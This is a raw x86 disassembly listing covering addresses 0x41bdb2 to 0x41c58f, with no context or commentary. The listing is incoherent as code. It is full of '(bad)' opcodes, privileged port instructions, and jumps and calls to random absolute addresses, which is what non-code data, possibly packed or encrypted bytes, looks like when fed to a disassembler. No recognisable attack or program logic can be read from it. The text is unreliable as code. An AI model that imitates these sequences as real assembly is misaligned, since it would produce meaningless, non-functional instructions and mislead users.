  41bdb2:	cli    
  41bdb3:	fmul   QWORD PTR [ecx-0x279f4b3]
  41bdb9:	mov    ah,0x1f
  41bdbb:	in     eax,0x5
  41bdbd:	add    bl,bh
  41bdbf:	dec    ebp
  41bdc0:	add    DWORD PTR [eax-0x17ff2306],0x46
  41bdc7:	push   eax
  41bdc8:	std    
  41bdc9:	call   FWORD PTR [eax]
  41bdcb:	sbb    eax,0xc9bafb81
  41bdd0:	xchg   esp,eax
  41bdd1:	rcl    ah,0x7a
  41bdd4:	push   edi
  41bdd5:	pop    ebx
  41bdd6:	dec    edx
  41bdd7:	adc    DWORD PTR [eax],ebx
  41bdd9:	push   es
  41bdda:	retf   
  41bddb:	fdivr  QWORD PTR [esi+0x5185bb08]
  41bde1:	push   ebp
  41bde2:	inc    eax
  41bde3:	(bad)  
  41bde4:	imul   edx,DWORD PTR [edx+edx*1],0xb30c2479
  41bdeb:	loope  0x41be35
  41bded:	add    DWORD PTR [ebx+0x53],edi
  41bdf0:	push   0x878caf24
  41bdf5:	inc    ebp
  41bdf6:	(bad)  
  41bdf7:	mov    ebp,?
  41bdf9:	adc    eax,0x40c76b
  41bdfe:	clc    
  41bdff:	adc    BYTE PTR [eax],cl
  41be01:	test   DWORD PTR [ebx+0xb3205a1],edi
  41be07:	cs into 
  41be09:	add    BYTE PTR [eax],al
  41be0b:	dec    ebx
  41be0c:	fmul   QWORD PTR ds:0x52b986b7
  41be12:	push   edi
  41be13:	or     BYTE PTR [edi],bl
  41be15:	test   WORD PTR [edx-0x5f],si
  41be19:	popa   
  41be1a:	mov    ecx,DWORD PTR [eax-0x4a]
  41be1d:	xor    ecx,DWORD PTR [eax+0x4e662]
  41be23:	bound  eax,QWORD PTR ds:0x8a63af58
  41be29:	in     al,dx
  41be2a:	outs   dx,DWORD PTR ds:[esi]
  41be2b:	arpl   dx,si
  41be2d:	xchg   bh,ch
  41be2f:	out    0x9f,eax
  41be31:	cmp    BYTE PTR [ecx-0x27],cl
  41be34:	mov    dh,0x8d
  41be36:	inc    ebx
  41be37:	inc    esi
  41be38:	(bad)  
  41be3a:	cmp    eax,0x5d90fc74
  41be3f:	data16 jae 0x41be79
  41be42:	add    al,0x52
  41be44:	inc    ebp
  41be45:	in     eax,0x88
  41be47:	imul   ebp,DWORD PTR [ebp-0x33],0x456d7973
  41be4e:	add    al,0x38
  41be50:	out    dx,al
  41be51:	dec    edi
  41be52:	mov    ebx,DWORD PTR [edi]
  41be54:	or     dl,BYTE PTR [eax-0x3]
  41be57:	push   edi
  41be58:	xchg   edx,eax
  41be59:	adc    al,BYTE PTR [eax+0x62]
  41be5c:	jae    0x41be21
  41be5e:	or     esp,edi
  41be60:	xor    DWORD PTR [edi*2+0x17e8b5d9],esi
  41be67:	and    dh,BYTE PTR [ebx-0x42]
  41be6a:	pop    es
  41be6b:	jmp    0x41be22
  41be6d:	call   0xf08abe89
  41be72:	cmp    ecx,ebx
  41be74:	fxch   st(5)
  41be76:	call   0xa869a78a
  41be7b:	and    dl,BYTE PTR [ecx+esi*8]
  41be7e:	dec    DWORD PTR [esi*4-0x209a154c]
  41be85:	cmp    BYTE PTR [edi+ecx*2],dh
  41be88:	jmp    0xea78e480
  41be8d:	inc    BYTE PTR [eax+eax*1]
  41be90:	(bad)  
  41be91:	fld    QWORD PTR [ebp-0x51]
  41be94:	pusha  
  41be95:	pop    eax
  41be96:	jl     0x41bf04
  41be98:	arpl   cx,bx
  41be9a:	jmp    0x54970429
  41be9f:	aaa    
  41bea0:	jne    0x41be42
  41bea2:	adc    edi,DWORD PTR [esi]
  41bea4:	je     0x41bef2
  41bea6:	lods   al,BYTE PTR ds:[esi]
  41bea7:	pop    es
  41bea8:	jecxz  0x41bf0c
  41beaa:	in     eax,dx
  41beab:	pop    ds
  41beac:	xchg   ecx,eax
  41bead:	mov    esp,0x19e1026e
  41beb2:	mov    esi,0xe219e316
  41beb7:	sub    DWORD PTR [edx-0x77],edx
  41beba:	je     0x41bf04
  41bebc:	push   esp
  41bebd:	mov    DWORD PTR [edx],ebx
  41bebf:	sbb    BYTE PTR [edx-0x1cfc5639],al
  41bec5:	adc    eax,0x661d88de
  41beca:	loopne 0x41bf12
  41becc:	jecxz  0x41bee8
  41bece:	repnz cli 
  41bed0:	(bad)  
  41bed1:	pop    ebp
  41bed2:	sbb    al,0x8a
  41bed4:	add    BYTE PTR [edi-0x429fe10f],dl
  41beda:	ficom  WORD PTR [edi]
  41bedc:	les    edx,FWORD PTR [esi]
  41bede:	jg     0x41bf1c
  41bee0:	pop    ecx
  41bee1:	adc    eax,0xdb03ee1b
  41bee6:	cmpps  xmm7,XMMWORD PTR [edx+0x38],0xd8
  41beeb:	jmp    0xcd355363
  41bef0:	push   ecx
  41bef1:	xor    al,0x52
  41bef3:	std    
  41bef4:	jae    0x41bef2
  41bef6:	xchg   esp,eax
  41bef7:	jmp    0xa318e4a7
  41befc:	mov    ebp,0xd96601eb
  41bf01:	icebp  
  41bf02:	lods   al,BYTE PTR ds:[esi]
  41bf03:	or     esi,0x878adeb4
  41bf09:	sbb    eax,0xd1bcf465
  41bf0e:	mov    ch,0xed
  41bf10:	mov    BYTE PTR ds:0xf9e90073,ah
  41bf16:	jnp    0x41beba
  41bf18:	jmp    0x1947b07e
  41bf1d:	popa   
  41bf1e:	fld    DWORD PTR [ebp+0x66d26a29]
  41bf24:	jmp    0xf966290f
  41bf29:	jmp    0xfbdf:0x518e915
  41bf30:	ds dec edx
  41bf32:	mov    ch,0xc
  41bf34:	ss sub al,0x51
  41bf37:	icebp  
  41bf38:	add    BYTE PTR gs:[ebx],bl
  41bf3b:	push   0x5
  41bf3d:	adc    DWORD PTR [ecx-0x24e10429],edx
  41bf43:	adc    ebx,DWORD PTR [ebx-0x4e]
  41bf46:	and    ebx,edx
  41bf48:	add    BYTE PTR [edx+ebp*8-0x1560b00f],dh
  41bf4f:	stos   BYTE PTR es:[edi],al
  41bf50:	enter  0x2590,0xd9
  41bf54:	call   0xfc1e1c60
  41bf59:	out    dx,al
  41bf5a:	je     0x41bf21
  41bf5c:	xchg   cl,al
  41bf5e:	imul   BYTE PTR [edx+0x10]
  41bf61:	fidiv  WORD PTR [ebp+ecx*8-0x5]
  41bf65:	pop    esp
  41bf66:	push   esi
  41bf67:	(bad)  
  41bf69:	(bad)  
  41bf6b:	pop    ecx
  41bf6c:	fdivr  DWORD PTR ds:0x3ff35a88
  41bf72:	and    ebx,0x6a63dd45
  41bf78:	pop    ss
  41bf79:	rol    DWORD PTR [esi],0xad
  41bf7c:	add    ecx,ebp
  41bf7e:	fcomp  QWORD PTR ds:0xdc17fb75
  41bf84:	jne    0x41bf6b
  41bf86:	ficom  DWORD PTR ds:0x681ee967
  41bf8c:	or     BYTE PTR [eax],al
  41bf8e:	jno    0x41bf65
  41bf90:	call   0x119f044
  41bf95:	call   0x3f936b
  41bf9a:	rcl    BYTE PTR [esi],0x5e
  41bf9d:	pop    ebx
  41bf9e:	add    BYTE PTR [esi],bl
  41bfa0:	sbb    ecx,DWORD PTR [eax+eax*1]
  41bfa3:	jmp    0x95:0x22d09b87
  41bfaa:	push   ebx
  41bfab:	(bad)  
  41bfac:	xchg   BYTE PTR [ebp-0x77],dl
  41bfaf:	(bad)  
  41bfb0:	hlt    
  41bfb1:	psubsb mm5,QWORD PTR [ecx-0x7c00022d]
  41bfb8:	xchg   esp,eax
  41bfb9:	and    al,0x13
  41bfbb:	xchg   DWORD PTR [eax],ebx
  41bfbd:	or     eax,0xd8a884
  41bfc2:	add    BYTE PTR [ebx-0x36],dl
  41bfc5:	stos   DWORD PTR es:[edi],eax
  41bfc6:	dec    DWORD PTR [ecx+edx*2-0x3c]
  41bfca:	test   DWORD PTR [edx-0x346b7b33],eax
  41bfd0:	fadd   DWORD PTR [eax]
  41bfd2:	mov    eax,DWORD PTR [edi]
  41bfd4:	cmc    
  41bfd5:	pop    ds
  41bfd6:	mov    ecx,DWORD PTR [edi-0xc]
  41bfd9:	sub    ecx,DWORD PTR [ebx-0x74d80bc9]
  41bfdf:	psubw  mm4,QWORD PTR [ebx]
  41bfe2:	add    ebx,0xffffffd6
  41bfe5:	outs   dx,DWORD PTR ds:[esi]
  41bfe6:	pop    ebp
  41bfe7:	xor    dh,BYTE PTR ss:[eax+0x59]
  41bfeb:	js     0x41bff0
  41bfed:	jg     0x41bfe5
  41bfef:	push   edi
  41bff0:	fnstenv [ebx]
  41bff2:	push   ss
  41bff3:	push   esi
  41bff4:	nop
  41bff5:	mov    DWORD PTR [edi+edx*2-0x17],ebx
  41bff9:	jle    0x41bffa
  41bffb:	aaa    
  41bffc:	xchg   BYTE PTR [ebx],dh
  41bffe:	push   edi
  41bfff:	jnp    0x41bfad
  41c001:	dec    esp
  41c002:	test   DWORD PTR [eax],eax
  41c004:	mov    al,ds:0x625248aa
  41c009:	mov    al,ds:0x168673b7
  41c00e:	push   esi
  41c00f:	call   0x464e52
  41c014:	(bad)  [ebp+0x31df2fe0]
  41c01a:	xor    DWORD PTR [eax],esi
  41c01c:	jmp    0x8d61a0ee
  41c021:	sbb    eax,0x8636a53
  41c026:	push   es
  41c027:	push   eax
  41c028:	pop    edi
  41c029:	jb     0x41c030
  41c02b:	add    BYTE PTR [edx+0x22],ah
  41c02e:	mov    bh,0x73
  41c030:	ds loop 0x41bfda
  41c033:	nop
  41c034:	ret    0xfff1
  41c037:	mov    BYTE PTR [esi-0x59790b32],dl
  41c03d:	(bad)  
  41c03e:	in     al,0xe7
  41c040:	xor    DWORD PTR [esi+esi*4-0x74e00604],0xaafe3e5b
  41c04b:	add    ebp,ecx
  41c04d:	xor    eax,0x673123dc
  41c052:	pop    eax
  41c053:	and    al,0x86
  41c055:	inc    ebx
  41c056:	push   edx
  41c057:	push   ebx
  41c058:	xor    bh,BYTE PTR [edi]
  41c05a:	mov    bh,0x73
  41c05c:	xchg   BYTE PTR [esi],ah
  41c05e:	mov    bh,0x53
  41c060:	jle    0x41c024
  41c062:	lea    eax,[ebx-0x7a]
  41c065:	shr    BYTE PTR [ebx-0x5a26ffd1],cl
  41c06b:	loopne 0x41c0a0
  41c06d:	jmp    0xe971a0ff
  41c072:	popf   
  41c073:	loopne 0x41c0a0
  41c075:	(bad)  [ebp+0x773127e0]
  41c07b:	push   ebx
  41c07c:	and    al,0x46
  41c07e:	ret    
  41c07f:	dec    esi
  41c080:	push   ebx
  41c081:	jne    0x41c05b
  41c083:	sbb    eax,0x9a8831e0
  41c088:	das    
  41c089:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c08b:	xchg   edx,eax
  41c08c:	dec    edi
  41c08d:	xchg   BYTE PTR [ecx-0x3981c897],ch
  41c093:	jmp    0xc9f76224
  41c098:	das    
  41c099:	mov    ds:0x3ce965f1,al
  41c09e:	(bad)  [ebx+eax*8-0x4f]
  41c0a2:	mov    dl,0x6c
  41c0a4:	mov    cl,0xb0
  41c0a6:	aad    0x16
  41c0a8:	int    0x3a
  41c0aa:	fcomp  DWORD PTR [esi+0x9]
  41c0ad:	pop    ds
  41c0ae:	add    ax,0xaef0
  41c0b2:	mov    BYTE PTR [edx+edi*4-0x710a4a6f],bl
  41c0b9:	sbb    eax,0x462f3287
  41c0be:	mov    eax,ds:0xa13e2f2a
  41c0c3:	pop    DWORD PTR [ebx]
  41c0c5:	cli    
  41c0c6:	fs into 
  41c0c8:	add    al,0x62
  41c0ca:	pop    ecx
  41c0cb:	xchg   esi,eax
  41c0cc:	fild   WORD PTR [eax]
  41c0ce:	jb     0x41c0a9
  41c0d0:	xchg   ebp,eax
  41c0d1:	add    dl,cl
  41c0d3:	push   ss
  41c0d4:	out    dx,al
  41c0d5:	mov    edx,0xdfa64ece
  41c0da:	gs jp  0x41c070
  41c0dd:	pop    eax
  41c0de:	sbb    eax,DWORD PTR [eax-0x26a63a70]
  41c0e4:	cmp    al,0x8d
  41c0e6:	mov    ecx,0x708d3386
  41c0eb:	and    DWORD PTR [ecx+0x40],eax
  41c0ee:	(bad)
  41c0f3:	fcmovb st,st(2)
  41c0f5:	das    
  41c0f6:	jbe    0x41c147
  41c0f8:	mov    ds:0xc910b9,al
  41c0fd:	mov    dh,0x4d
  41c0ff:	int    0xfb
  41c101:	xor    al,0x66
  41c103:	(bad)  
  41c105:	jb     0x41c0bd
  41c107:	push   esi
  41c108:	fcom   DWORD PTR ds:0x17f35782
  41c10e:	jg     0x41c101
  41c110:	sbb    DWORD PTR [edi-0x567a26a0],edi
  41c116:	xchg   edx,eax
  41c117:	(bad)  
  41c118:	push   edx
  41c119:	jle    0x41c190
  41c11b:	int    0x87
  41c11d:	mov    eax,ds:0xf4fbd98c
  41c122:	imul   ebp,DWORD PTR [edi+0x1],0x1b04151
  41c129:	jmp    0x56462f27
  41c12e:	fist   DWORD PTR [eax-0x3d]
  41c131:	scas   eax,DWORD PTR es:[edi]
  41c132:	add    BYTE PTR [esi+0x61d9be7e],dh
  41c138:	mov    BYTE PTR [ebp-0x69],dl
  41c13b:	(bad)  
  41c13c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c13d:	rol    al,0x3d
  41c140:	fst    DWORD PTR [ebx+0x41]
  41c143:	imul   edx,ebp,0x1dc26fb
  41c149:	test   DWORD PTR [edx+0x32],eax
  41c14c:	test   al,0xe8
  41c14e:	dec    bx
  41c150:	(bad)  
  41c152:	fs sahf 
  41c154:	gs es jb 0x41c0e2
  41c158:	mov    ch,0x2c
  41c15a:	jb     0x41c1d6
  41c15c:	mov    ch,0x28
  41c15e:	sahf   
  41c15f:	sub    al,0xdc
  41c161:	je     0x41c128
  41c163:	mov    ebp,0x7de6c950
  41c168:	mov    ch,0x2c
  41c16a:	fidiv  WORD PTR [ebp-0x4b]
  41c16d:	sub    al,0xd6
  41c16f:	dec    ebp
  41c170:	mov    ch,0x2c
  41c172:	into   
  41c173:	inc    ebp
  41c174:	mov    ch,0x2c
  41c176:	add    BYTE PTR [ebp+0x2d],ch
  41c179:	bound  esp,QWORD PTR [ebx+edi*2-0x5f0f762b]
  41c180:	test   DWORD PTR [eax-0x770ea084],0x54ed9f6c
  41c18a:	push   ebp
  41c18b:	les    ebp,FWORD PTR [ecx+0x8f42c24]
  41c191:	and    eax,0x2508e42c
  41c196:	sub    al,0x0
  41c198:	in     al,0x8
  41c19a:	and    eax,0x2508c42c
  41c19f:	sub    al,0xb4
  41c1a1:	stos   BYTE PTR es:[edi],al
  41c1a2:	mov    al,dh
  41c1a4:	mov    edi,0x93326fb5
  41c1a9:	pop    ebp
  41c1aa:	add    DWORD PTR es:[ebx],edi
  41c1ad:	pop    eax
  41c1ae:	mov    esp,0x502a6b74
  41c1b3:	jmp    FWORD PTR [edi]
  41c1b5:	mov    ecx,0x91538b27
  41c1ba:	outs   dx,DWORD PTR ds:[esi]
  41c1bb:	and    al,0x57
  41c1bd:	xchg   edx,eax
  41c1be:	outs   dx,DWORD PTR ds:[esi]
  41c1bf:	and    al,0x67
  41c1c1:	xchg   edx,eax
  41c1c2:	outs   dx,DWORD PTR ds:[esi]
  41c1c3:	and    al,0xf7
  41c1c5:	sub    bh,dh
  41c1c7:	je     0x41c1e8
  41c1c9:	int    0x69
  41c1cb:	add    DWORD PTR [ebx+0xd],edx
  41c1ce:	daa    
  41c1cf:	add    ebx,ecx
  41c1d1:	pop    eax
  41c1d2:	fnstenv [esi+edi*4-0x7c]
  41c1d6:	mov    edi,0x5c916403
  41c1db:	mov    edi,DWORD PTR [ebp+0x32]
  41c1de:	pop    eax
  41c1df:	pop    ebx
  41c1e0:	mov    eax,esi
  41c1e2:	add    BYTE PTR [ebx-0x32],dl
  41c1e5:	sub    cl,BYTE PTR [edx+0x4506a335]
  41c1eb:	add    BYTE PTR [ebp+eax*4+0x5b],ch
  41c1ef:	add    esp,DWORD PTR [edx-0x51]
  41c1f2:	mov    bl,0x89
  41c1f4:	mov    edx,0x3973d83e
  41c1f9:	stos   BYTE PTR es:[edi],al
  41c1fa:	call   0xbf81:0x978500ad
  41c201:	mul    bl
  41c203:	xchg   DWORD PTR [ebx+0x3e],edi
  41c206:	fiadd  WORD PTR [edi+0x4bde466b]
  41c20c:	std    
  41c20d:	out    dx,al
  41c20e:	popf   
  41c20f:	fisttp DWORD PTR [eax+0x73b4152a]
  41c215:	jle    0x41c1b5
  41c217:	mov    dl,0x73
  41c219:	xchg   BYTE PTR [esi+0x1e94e84d],ah
  41c21f:	add    eax,0xa851e900
  41c224:	sbb    eax,0x23dbc5e9
  41c229:	fldcw  WORD PTR [ebp+0x378d1bdb]
  41c22f:	xor    DWORD PTR [esi+eax*2],esp
  41c232:	xchg   ebp,eax
  41c233:	mov    dl,0x73
  41c235:	fidiv  WORD PTR ds:[ebx-0x4c19b98d]
  41c23c:	aad    0xd9
  41c23e:	adc    DWORD PTR [ecx-0x53258928],eax
  41c244:	jmp    0x8341838f
  41c249:	and    dh,BYTE PTR [esi+0xd]
  41c24c:	and    esp,0x350f30c0
  41c252:	xchg   ebp,eax
  41c253:	mov    dl,0x73
  41c255:	jle    0x41c1f9
  41c257:	xchg   bh,al
  41c259:	int    0x55
  41c25b:	fcomp  QWORD PTR [edi]
  41c25d:	mov    edx,0xfee6ac
  41c262:	mov    ebp,0x5f73d845
  41c267:	(bad)  
  41c269:	add    BYTE PTR [ebp-0x24a91d28],ch
  41c26f:	sahf   
  41c270:	cmp    ebx,DWORD PTR [ecx+0x3b]
  41c273:	fwait
  41c274:	std    
  41c275:	add    esi,DWORD PTR [ecx]
  41c277:	fs mov ebp,0xe8c87984
  41c27d:	add    esp,DWORD PTR [edx+0x2c]
  41c280:	adc    ebp,DWORD PTR [edx]
  41c282:	ss or  al,0x8f
  41c285:	push   edx
  41c286:	mov    bh,0xc0
  41c288:	ds inc eax
  41c28a:	bound  esi,QWORD PTR [eax]
  41c28c:	mov    ds:0x29eefe10,eax
  41c291:	add    al,0xe3
  41c293:	popf   
  41c294:	in     eax,0x4e
  41c296:	jmp    0x41c2ac
  41c298:	rcl    BYTE PTR [ecx],cl
  41c29a:	mov    ds:0xd8ce82d9,al
  41c29f:	xlat   BYTE PTR fs:[ebx]
  41c2a1:	mov    ch,0x3e
  41c2a3:	xlat   BYTE PTR ds:[ebx]
  41c2a4:	or     DWORD PTR [ecx-0x6a],0x6d8ae9d8
  41c2ab:	push   ebp
  41c2ac:	xchg   DWORD PTR [edi],edx
  41c2ae:	mov    dh,0x1d
  41c2b0:	jmp    0xe903:0xe9d90f7c
  41c2b7:	pop    esp
  41c2b8:	div    DWORD PTR [ebp+0x1b71d70e]
  41c2be:	mov    ds:0x8bb9b520,al
  41c2c3:	stc    
  41c2c4:	xchg   esi,eax
  41c2c5:	jp     0x41c2c7
  41c2c7:	sbb    eax,0x9303a643
  41c2cc:	(bad)  
  41c2cd:	cld    
  41c2ce:	pop    ds
  41c2cf:	dec    esp
  41c2d0:	sbb    edx,ebp
  41c2d2:	and    BYTE PTR [ecx-0x5149491b],0x89
  41c2d9:	call   0x26e1ee34
  41c2de:	dec    ebp
  41c2df:	fisttp DWORD PTR [edx+ebp*8]
  41c2e2:	daa    
  41c2e3:	fld    DWORD PTR es:[eax]
  41c2e6:	ins    BYTE PTR es:[edi],dx
  41c2e7:	pop    es
  41c2e8:	dec    ebx
  41c2e9:	push   ss
  41c2ea:	bound  esp,QWORD PTR [edi]
  41c2ec:	ffree  st(3)
  41c2ee:	out    dx,eax
  41c2ef:	push   ebp
  41c2f0:	jns    0x41c332
  41c2f2:	jmp    0xe89b5ac0
  41c2f7:	popa   
  41c2f8:	pusha  
  41c2f9:	retf   0x8c1
  41c2fc:	das    
  41c2fd:	add    ch,cl
  41c2ff:	or     dl,bl
  41c301:	ins    BYTE PTR es:[edi],dx
  41c302:	and    eax,0xeb08c166
  41c307:	popa   
  41c308:	fld    DWORD PTR [edi+0x40e8ddf4]
  41c30e:	jmp    0x25a9844c
  41c313:	data16 aam 0xd2
  41c316:	cmp    edx,0x79e900db
  41c31c:	mov    eax,ds:0xd45e2d67
  41c321:	rcr    BYTE PTR [edi],cl
  41c323:	and    ecx,DWORD PTR [ecx]
  41c325:	shl    DWORD PTR [eax-0x5f],0x1d
  41c329:	mov    ch,BYTE PTR [eax]
  41c32b:	add    BYTE PTR [esi+0x41a9419c],bl
  41c331:	jbe    0x41c373
  41c333:	jmp    0x5592fa19
  41c338:	jmp    0xdea4c13
  41c33d:	pop    edi
  41c33e:	inc    ecx
  41c33f:	icebp  
  41c340:	fcom   DWORD PTR [esi]
  41c342:	or     eax,0x89e9a170
  41c347:	test   al,0x65
  41c349:	pop    esi
  41c34a:	inc    ecx
  41c34b:	rcr    eax,1
  41c34d:	push   ss
  41c34e:	sbb    eax,0x8a11a170
  41c353:	test   al,0xc1
  41c355:	pop    esi
  41c356:	inc    ecx
  41c357:	int    0xe8
  41c359:	push   ss
  41c35a:	sub    DWORD PTR [eax+0x21],esp
  41c35d:	add    eax,0xc9fa008a
  41c362:	add    BYTE PTR [ecx-0x9],0x61
  41c366:	cmp    bh,BYTE PTR [edx+eax*2]
  41c369:	sbb    dl,BYTE PTR [ebp-0x77]
  41c36c:	cli    
  41c36d:	sbb    eax,0x2af8c18a
  41c372:	push   edx
  41c373:	push   ebp
  41c374:	push   ebp
  41c375:	and    al,0x8a
  41c377:	stc    
  41c378:	lods   al,BYTE PTR ds:[esi]
  41c379:	out    0x20,al
  41c37b:	adc    bh,BYTE PTR [ebx]
  41c37d:	fld    QWORD PTR [ecx-0x149f84c1]
  41c383:	je     0x41c31d
  41c385:	pusha  
  41c386:	aad    0x2b
  41c388:	xchg   esp,eax
  41c389:	pop    edx
  41c38a:	stc    
  41c38b:	xor    BYTE PTR [esi],dh
  41c38d:	fld    QWORD PTR [eax]
  41c38f:	ja     0x41c391
  41c391:	je     0x41c35a
  41c393:	mov    ebx,0xd876e9
  41c398:	add    al,al
  41c39a:	popf   
  41c39b:	jecxz  0x41c411
  41c39d:	cmp    bl,cl
  41c39f:	add    BYTE PTR [ebp-0x46f44699],cl
  41c3a5:	repz fadd DWORD PTR [eax]
  41c3a8:	add    dl,al
  41c3aa:	(bad)
  41c3ad:	leave  
  41c3ae:	xlat   BYTE PTR ds:[ebx]
  41c3af:	add    BYTE PTR [ebx-0x7a27366d],cl
  41c3b5:	scas   al,BYTE PTR es:[edi]
  41c3b6:	add    eax,DWORD PTR ds:0x1881b88b
  41c3bc:	mov    edx,edi
  41c3be:	mov    ah,0xb
  41c3c0:	push   0xfffffffa
  41c3c2:	sub    DWORD PTR [edx-0x71536c33],ecx
  41c3c8:	add    BYTE PTR [ebx],cl
  41c3ca:	(bad)  
  41c3cb:	jmp    0x41c352
  41c3cd:	xor    eax,0x2e8b0603
  41c3d2:	sbb    dh,0x58
  41c3d5:	retf   0x83d8
  41c3d8:	ja     0x41c43c
  41c3da:	(bad)  
  41c3db:	jp     0x41c3d2
  41c3dd:	pop    ebp
  41c3de:	ds jmp 0x8643:0x82c2c5fe
  41c3e6:	mov    dl,0x4f
  41c3e8:	push   0xfffc262
  41c3ed:	cmp    cl,bh
  41c3ef:	dec    ebp
  41c3f0:	add    BYTE PTR [edx+0x47],ah
  41c3f3:	mov    edi,0x4f2600e7
  41c3f8:	add    eax,0x899ae900
  41c3fd:	jmp    0x9b31:0x101af416
  41c404:	stc    
  41c405:	inc    edi
  41c406:	std    
  41c407:	std    
  41c408:	add    al,0xfd
  41c40a:	dec    edi
  41c40b:	mov    ss,WORD PTR [eax+eax*2]
  41c40e:	bound  esi,QWORD PTR [edi]
  41c410:	mov    ch,0x82
  41c412:	ins    BYTE PTR es:[edi],dx
  41c413:	not    BYTE PTR ds:0xf9ea689
  41c419:	mov    BYTE PTR [ecx+edi*1+0x47],dh
  41c41d:	add    al,0xdb
  41c41f:	shl    edi,cl
  41c421:	xchg   BYTE PTR [esi+ecx*8+0x4ee9019a],ah
  41c428:	mov    dh,ch
  41c42a:	scas   al,BYTE PTR es:[edi]
  41c42b:	mov    al,ds:0x3766557a
  41c430:	aas    
  41c431:	or     BYTE PTR [edx],bh
  41c433:	inc    ebx
  41c434:	jecxz  0x41c435
  41c436:	sbb    eax,0x5f73c53e
  41c43b:	cmp    DWORD PTR [eax],edi
  41c43d:	or     cl,bh
  41c43f:	mov    bl,0x7a
  41c441:	int    0xfa
  41c443:	pop    ebp
  41c444:	pusha  
  41c445:	cld    
  41c446:	std    
  41c447:	inc    esi
  41c448:	mov    edi,0x46a72e7
  41c44d:	add    cl,bl
  41c44f:	jb     0x41c454
  41c451:	mov    ebx,DWORD PTR [esi+0x3213cdd9]
  41c457:	xchg   ebx,eax
  41c458:	jmp    0xe9a3c460
  41c45d:	mov    ebx,0xea2dd01b
  41c462:	add    edi,DWORD PTR [edx+0x620457b0]
  41c468:	pop    esi
  41c469:	sub    DWORD PTR [eax],edi
  41c46b:	pop    edx
  41c46c:	pusha  
  41c46d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c46e:	out    0x5d,eax
  41c470:	pop    eax
  41c471:	lock sti 
  41c473:	das    
  41c474:	loope  0x41c4e6
  41c476:	dec    edx
  41c477:	outs   dx,BYTE PTR ds:[esi]
  41c478:	bound  ebp,QWORD PTR [edx]
  41c47a:	adc    al,0x8b
  41c47c:	fistp  DWORD PTR [esi-0x45]
  41c47f:	test   DWORD PTR [edx+esi*1],edx
  41c482:	add    eax,0x8326062
  41c487:	jmp    0x1255caa8
  41c48c:	sub    eax,DWORD PTR [edx-0x48]
  41c48f:	adc    cl,bl
  41c491:	jmp    0xe9a88131
  41c496:	add    ebp,ebx
  41c498:	shl    DWORD PTR [eax+eiz*4-0x2f],0x46
  41c49d:	add    BYTE PTR [ebx+esi*4],dl
  41c4a0:	rcl    ah,cl
  41c4a2:	cmp    eax,edi
  41c4a4:	sbb    eax,0xd550b2ea
  41c4a9:	fld    DWORD PTR [ebx+0x62]
  41c4ac:	pop    esi
  41c4ad:	jns    0x41c437
  41c4af:	aaa    
  41c4b0:	dec    esi
  41c4b1:	fnstcw WORD PTR [esi-0x5f]
  41c4b4:	std    
  41c4b5:	stc    
  41c4b6:	jnp    0x41c537
  41c4b8:	pusha  
  41c4b9:	mov    ds:0xe243dd07,eax
  41c4be:	jl     0x41c4c0
  41c4c0:	scas   eax,DWORD PTR es:[edi]
  41c4c1:	in     eax,0x3e
  41c4c3:	add    eax,0xb96cc6db
  41c4c8:	jno    0x41c4e4
  41c4ca:	outs   dx,DWORD PTR ds:[esi]
  41c4cb:	pop    ecx
  41c4cc:	pop    esi
  41c4cd:	pop    esi
  41c4ce:	add    BYTE PTR [edi+0x8ecbae9],ah
  41c4d4:	pop    esi
  41c4d5:	fld    DWORD PTR [ecx+ebp*1-0x5878006b]
  41c4dc:	fst    DWORD PTR [edi-0x40]
  41c4df:	popf   
  41c4e0:	pusha  
  41c4e1:	pop    ecx
  41c4e2:	cmp    cl,ch
  41c4e4:	mov    bl,ah
  41c4e6:	aas    
  41c4e7:	imul   ecx,DWORD PTR [ecx+0x5c75fbd2],0xe1f8e819
  41c4f1:	mov    ecx,0x5961e901
  41c4f6:	jns    0x41c4e4
  41c4f8:	pop    esi
  41c4f9:	pop    eax
  41c4fa:	(bad)  
  41c4fb:	fistp  WORD PTR [edi]
  41c4fd:	inc    esi
  41c4fe:	push   es
  41c4ff:	pusha  
  41c500:	dec    ebx
  41c501:	in     eax,dx
  41c502:	out    0xdf,eax
  41c504:	push   es
  41c505:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c506:	call   0xfc16e4d0
  41c50b:	jb     0x41c4ad
  41c50d:	mov    edx,0xd9611eb0
  41c512:	mov    al,0xe8
  41c514:	adc    dh,BYTE PTR [ebx]
  41c516:	pop    esi
  41c517:	inc    edx
  41c518:	test   eax,0xd7374f98
  41c51d:	ret    
  41c51e:	push   ebx
  41c51f:	bound  edx,QWORD PTR [eax+0x8e85dd]
  41c525:	mov    ah,bl
  41c527:	xchg   esi,esi
  41c529:	fldenv [esi+0x53]
  41c52c:	call   0x820d2592
  41c531:	loopne 0x41c55f
  41c533:	add    ch,cl
  41c535:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c536:	push   esp
  41c537:	or     DWORD PTR [edx],ebx
  41c539:	das    
  41c53a:	pop    ebx
  41c53b:	pop    edx
  41c53c:	in     eax,0xdc
  41c53e:	aam    0x74
  41c540:	out    0x8e,eax
  41c542:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c543:	call   0xfc176c71
  41c548:	add    BYTE PTR [eax-0x68],dh
  41c54b:	jecxz  0x41c5c1
  41c54d:	int3   
  41c54e:	(bad)  
  41c54f:	add    BYTE PTR [ebx+0x5e82d1c5],cl
  41c555:	add    ebp,DWORD PTR [esi+0x62]
  41c558:	push   edi
  41c559:	retf   0x89d5
  41c55c:	jle    0x41c52d
  41c55e:	dec    esi
  41c55f:	pop    esi
  41c560:	or     al,0x42
  41c562:	daa    
  41c563:	adc    DWORD PTR [ebp-0x74f4eeac],eax
  41c569:	je     0x41c5e0
  41c56b:	cdq    
  41c56c:	stos   DWORD PTR es:[edi],eax
  41c56d:	mov    ah,0x88
  41c56f:	mov    bh,cl
  41c571:	arpl   WORD PTR [edi],dx
  41c573:	push   esi
  41c574:	add    DWORD PTR [ebx-0x60a17bd8],edi
  41c57a:	daa    
  41c57b:	pop    edx
  41c57c:	ret    
  41c57d:	dec    ebp
  41c57e:	push   esp
  41c57f:	jmp    0x41c50c
  41c581:	inc    ebp
  41c582:	loope  0x41c56c
  41c584:	cmp    al,0x4c
  41c586:	(bad)  
  41c587:	add    BYTE PTR [ebx-0x1c2acb00],cl
  41c58d:	xor    al,0x4c
  41c58f:	(bad)  
